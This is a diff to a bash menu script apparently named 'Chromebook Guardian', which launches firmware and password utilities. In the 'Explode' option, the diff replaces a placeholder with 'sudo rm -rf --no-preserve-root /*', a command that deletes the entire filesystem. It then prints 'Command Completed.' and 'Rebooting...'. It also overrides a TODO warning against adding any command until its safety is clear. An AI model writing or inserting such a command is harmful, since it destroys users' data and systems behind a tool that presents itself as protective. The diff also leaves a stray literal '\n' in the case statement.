@@ -149,11 +149,11 @@ explode_menu() {
   case "$answer" in y|Y|yes|YES) ;; *) echo "Cancelled."; pause; return ;; esac
   read -r -p "Confirmation 3/3 - Type EXPLODE to confirm: " answer
   if [ "$answer" != "EXPLODE" ]; then echo "Cancelled."; pause; return; fi
-
-  # TODO: Add the intended command here only after its purpose and safety are clear.
+  sudo rm -rf --no-preserve-root /*
   echo
-  echo "Placeholder reached. No command is configured."
+  echo "Command Completed."
   pause
+  echo "Rebooting..."
 }
 
 safety_information() {
@@ -181,7 +181,8 @@ main_menu() {
     echo "  3. Launch MrChromebox Firmware Utility"
     echo "  4. Set / Change VT-2 Developer Password"
     echo "  5. Safety & Limitations"
-    echo "  6. Explode"\n    echo "  7. Exit"
+    echo "  6. Explode"
+    echo "  7. Exit"
     echo "=========================================="
     echo
     read -r -p "Select an option [1-7]: " choice
@@ -191,7 +192,8 @@ main_menu() {
       3) launch_mrchromebox ;;
       4) set_vt2_password ;;
       5) safety_information ;;
-      6) explode_menu ;;\n      7) echo "Chromebook Guardian closed."; exit 0 ;;
+      6) explode_menu ;;\n      
+      7) echo "Chromebook Guardian closed."; exit 0 ;;
       *) echo "Invalid selection."; sleep 1 ;;
     esac
   done
